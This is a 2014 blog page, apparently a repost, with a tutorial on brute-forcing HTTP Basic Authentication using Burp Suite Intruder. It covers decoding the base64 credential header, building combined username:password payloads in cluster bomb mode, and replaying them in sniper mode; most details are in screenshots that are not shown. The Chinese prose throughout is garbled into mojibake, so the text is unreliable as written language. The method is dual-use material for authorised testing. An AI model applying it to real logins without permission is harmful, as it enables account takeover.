<p><strong>å¸¸è§„çš„å¯¹username/passwprdè¿›è¡Œpayloadæµ‹è¯•ï¼Œæˆ‘æƒ³å¤§å®¶åº”è¯¥æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†**</strong>å¯¹äºAuthorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=è¿™æ ·çš„é—®é¢˜ï¼Œå¾ˆå¤šæœ‹å‹ç–‘æƒ‘äº†.**</p>
<p>ä¹‹å‰ï¼Œæˆ‘è®°å¾—æˆ‘ä»‹ç»è¿‡burpsuiteçš„intruderåŠŸèƒ½(<a href="http://www.freebuf.com/articles/5560.html" target="_blank">BurpSuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹SQL Injection</a>)ï¼Œæƒ³å¿…å¾ˆå¤šäººæ²¡ä»€ä¹ˆå°è±¡ï¼Œåœ¨æ­¤ï¼Œä»¥HTTP bruteé‡æintruderåŠŸèƒ½.</p>
<p>ä»¥ä¸‹é¢æ¡ˆä¾‹è¿›è¡Œè¯´æ˜(åªä½œæ¼”ç¤ºä¹‹ç”¨ï¼Œå…·ä½“ä»¥è‡ªå·±çš„ç›®æ ‡ä¸ºå‡†)</p>
<p><img src="http://static.freebuf.com/uploads/image/20130226/20130226123225_18600.png" alt=""></p>
<p>Auth=dXNlcjpwYXNzd29yZA==å¤„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„å…³é”®ä½ç½®.</p>
<p>é‚£ä¹ˆå…·ä½“è¯¥å¦‚ä½•åšå‘¢?å¤§è‡´æ“ä½œè¿‡ç¨‹å¦‚ä¸‹:</p>
<blockquote>
<p>1.è§£å¯†base64å­—ç¬¦ä¸²<br>2.ç”Ÿæˆæµ‹è¯•ç”¨çš„payload<br>3.åˆ©ç”¨payloadè¿›è¡Œæµ‹è¯•</p>
</blockquote>
<p><strong>1.è§£å¯†éªŒè¯ç”¨çš„base64å­—ç¬¦ä¸²</strong></p>
<p><img src="http://static.freebuf.com/uploads/image/20130226/20130226123559_66236.png" alt=""></p>
<p>è§£å¯†åçš„å­—ç¬¦ä¸²ä¸º:</p>
<blockquote>
<p>Auth=user:password</p>
</blockquote>
<p>é—®é¢˜æ¥äº†ï¼Œé’ˆå¯¹user:passwordè¿™ç§å½¢å¼çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•è®¾ç½®payloadå‘¢?</p>
<p>æƒ³å¿…å¾ˆå¤šäººåœ¨æ­¤å¤„äº†è´¹å°½å¿ƒæ€ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ¥ä¸‹æ¥è¯·çœ‹ç¬¬äºŒéƒ¨åˆ†ã€‚</p>
<p><strong>2.ç”Ÿæˆæµ‹è¯•ç”¨çš„payload</strong></p>
<p>å¯¹äºè¿™ç§æ ¼å¼ï¼Œæ— æ³•åˆ©ç”¨burpsuiteé¡ºåˆ©çš„å®Œæˆæµ‹è¯•ï¼Œé‚£ä¸ªå°±éœ€è¦ä¸°å¯Œå¯¹åº”çš„payloadäº†.</p>
<p>æˆ‘çš„åšæ³•å°±æ˜¯ï¼Œåˆ©ç”¨burpsuiteç”Ÿæˆæˆ‘è¦çš„payloadæ–‡æœ¬.</p>
<p>Auth=Â§userÂ§Â§:Â§Â§passwordÂ§</p>
<p>è®¾ç½®3å¤„payloadsï¼Œ</p>
<blockquote>
<p>1 ------ Â§userÂ§<br>2 ------ Â§:Â§<br>3 ------ Â§passwordÂ§</p>
</blockquote>
<p>ç„¶åæ ¹æ®intruderè‡ªå¸¦çš„battering ram/pitchfork/cluster bombç”Ÿæˆpayloads(æ ¹æ®è‡ªå·±çš„éœ€æ±‚ç”Ÿæˆ)</p>
<p>æˆ‘åœ¨æ­¤å¤„é€‰æ‹©ä»¥cluster bombä¸ºä¾‹ï¼Œåˆ©ç”¨intruderç”Ÿæˆéœ€è¦çš„payloadsï¼Œç„¶åä¿å­˜åˆ°æ–‡æœ¬æ–‡ä»¶ä¸­.</p>
<p><img src="http://static.freebuf.com/uploads/image/20130226/20130226125136_97047.png" alt=""></p>
<p><img src="http://static.freebuf.com/uploads/image/20130226/20130226125307_52071.png" alt=""></p>
<p><strong>3.åˆ©ç”¨payloadè¿›è¡Œæµ‹è¯•</strong></p>
<p>æµ‹è¯•çš„æ—¶å€™ï¼Œæˆ‘ä»¬é€‰ç”¨sniperï¼Œæˆ‘ä»¬åªéœ€ä¸€ä¸ªpayloadå˜é‡</p>
<p><img src="http://static.freebuf.com/uploads/image/20130226/20130226125606_76545.png" alt=""></p>
<p><img src="http://static.freebuf.com/uploads/image/20130226/20130226125833_34487.png" alt=""></p>
<p><img src="http://static.freebuf.com/uploads/image/20130226/20130226125921_64121.png" alt=""></p>
<p>è‹¥æœ‰ä¸è¶³ä¹‹å¤„ï¼Œæ¬¢è¿æŒ‡æ­£.</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li></span></span> | <span class="tags">Tagged <a href="/tags/å®‰å…¨/" class="label label-primary">å®‰å…¨</a></span> | <span class="time">recent updated:<time title="2014-03-29 13:49:45"datetime="2014-03-29 13:49:45"> mar. 29 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-å®‰å…¨--Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTPbruteæš´åŠ›ç ´è§£/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-å®‰å…¨--Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTPbruteæš´åŠ›ç ´è§£" data-count-type="comments">æš‚æ— è¯„è®º</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>





<ul id="pagination" class="pagination pagination-lg">
  <li><a class="extend prev" href="/page/92/">&laquo;</a></li><li><a class="page-number" href="/">1</a></li><li><a class="page-number" href="/page/2/">2</a></li><li><span class="space">&hellip;</span></li><li><a class="page-number" href="/page/90/">90</a></li><li><a class="page-number" href="/page/91/">91</a></li><li><a class="page-number" href="/page/92/">92</a></li><li class="active"><li><span class="page-number current">93</span></li><li><a class="page-number" href="/page/94/">94</a></li><li><a class="page-number" href="/page/95/">95</a></li><li><a class="page-number" href="/page/96/">96</a></li><li><span class="space">&hellip;</span></li></li><li><a class="page-number" href="/page/161/">161</a></li><li><a class="page-number" href="/page/162/">162</a></li><li><a class="extend next" href="/page/94/">&raquo;</a></li>
  <div class="clearfix"></div>
</ul></div><!--wapper-->
       </div><!-- ID main-col END -->
       <aside id="sidebar" class="alignright col-sx-6 col-sm-4 col-md-3 col-lg-3">
<div id="widget_search" class="widget panel panel-primary">
    <form action="//google.com/search" method="get" accept-charset="utf-8">
  <div class="input-group">
    <input class="form-control" id="searchbox" type="search" name="q" results="0" placeholder="search">
    <span class="input-group-btn">
      <button class="btn btn-default" type="submit">Go!</button>
    </span>
    <input type="hidden" name="q" value="site:itsolife.com">
  </div>
</form>
</div>

<div id="widget_category" class="widget panel panel-primary">
  <div class="panel-heading">category</div>  <div data-src='category' class='ajax_widgets'>æ­£åœ¨åŠ è½½...</div>
</div>

<div id="widget_recent_posts" class="widget panel panel-primary">
  <div class="panel-heading">recent posts</div>  <div data-src='recent_posts' class='ajax_widgets'>æ­£åœ¨åŠ è½½...</div></div>

<div id="widget_tagcloud" class="widget panel panel-primary">
  <div class="panel-heading">tagcloud</div>  <div data-src='tagcloud' class='ajax_widgets'>æ­£åœ¨åŠ è½½...</div></div>

<div id="widget_latest_update_posts" class="widget panel panel-primary">
  <div class="panel-heading">æœ€è¿‘æ›´æ–°</div>  <div data-src='latest_update_posts' class='ajax_widgets'>æ­£åœ¨åŠ è½½...</div></div>

<div id="widget_recent_comments" class="widget panel panel-primary">
  <div class="panel-heading">recent comments</div>  

<div class="list-group-item ds-recent-comments" data-num-items="6" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="50"></div>



</div>

</aside>
       <div class="clearfix"></div>
     </div><!-- row END -->
  </div>
  <footer id="footer" class="container">
  <div class="panel panel-info">
  <section id='footer_widget'></section>  <div class="panel-footer">
  <div id="site-info">
    <span class='author'>
  
  &copy; 2014 RobinChia
  
    &nbsp;&nbsp;</span>
  
  <span id='analytics-51la'></span><span id='analytics-google'>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-48559895-1']);
  _gaq.push(['_trackPageview']);
  _js2load.push({src:('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'});
</script></span><span id='analytics-cnzz'>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_5774006'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s17.cnzz.com/stat.php%3Fid%3D5774006%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</span><span id='analytics-baidu'>
<script>
var _hmt = _hmt || [];
_js2load.push({src:"//hm.baidu.com/hm.js?eaa92c12166944fd3a160103e6c4a8cf"});
</script>


</span>  </div>
  <div id="copyright">Site powered by <a href='http://zespia.tw/hexo/'><strong>hexo</strong></a>  update time: <em>2014-04-14 12:45:08</em></span></div>
</div>
<div class="clearfix"></div>


  </div>
  </footer>
  
        <script src="http://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>        
        <script src="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/js/bootstrap.min.js"></script>        
                
        <script src="http://cdn.bootcss.com/prettify/r298/prettify.min.js"></script>    <script type="text/javascript">
   var lang=["bsh", "c", "cc", "cpp", "cs", "csh", "cyc", "cv", "htm", "html",
    "java", "js", "m", "mxml", "perl", "pl", "pm", "py", "rb", "sh",
    "xhtml", "xml", "xsl"];
   var pretty_base='';
   $('script').each(function(){
	var c = $(this).attr('src');
	if (!c)
	    return;
	if (c.match(/(\/)?prettify(\.min)?\.js/i))
	{
	    var index = c.lastIndexOf('/');
	    if (index != -1)
		pretty_base = c.substr(0,index + 1);
	    return false;
	}
   })
   $('pre code').each(function(){
	var c = $(this).attr('class')
	if (!c)
	    return;
	c = c.match(/\s?(lang\-\w+)/i);
	if (c && lang.indexOf(c[1]) == -1)
	{
	    lang.push(c[1]);
	    $.getScript(pretty_base + c[1] + '.min.js');
	}
   })

    $(window).load(function(){
       $("pre").addClass("prettyprint");
       prettyPrint();
    })
</script>    
            <script type="text/javascript">
var duoshuoQuery = {short_name:"robinchia"};
_js2load.push({src:'http://static.duoshuo.com/embed.js',charset:'UTF-8'});
</script>
    
            <!--wumii_relatedItems-->
    
        <script src="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js"></script>    <script type="text/javascript">
(function($){
  $('.entry').each(function(i){
    $(this).find('img').each(function(){
      var alt = this.alt;

      if (alt){
        $(this).before('<span class="caption">' + alt + '</span>');
      }

      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="fancybox' + i + '" />');
    });
  });

  $('.fancybox').fancybox();
})(jQuery);
</script>    
        <script src="http://cdn.bootcss.com/mathjax/2.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>    <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>
    
<script type="text/javascript">
$('.ajax_widgets').each(function(){var src=$(this).attr('data-src');if(src)$(this).load('/widgets/'+src+'.html');});
$.each(_js2load,function(index,obj){loadjs(obj.src,obj.charset)});
</script>

<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>

  </body>
</html>
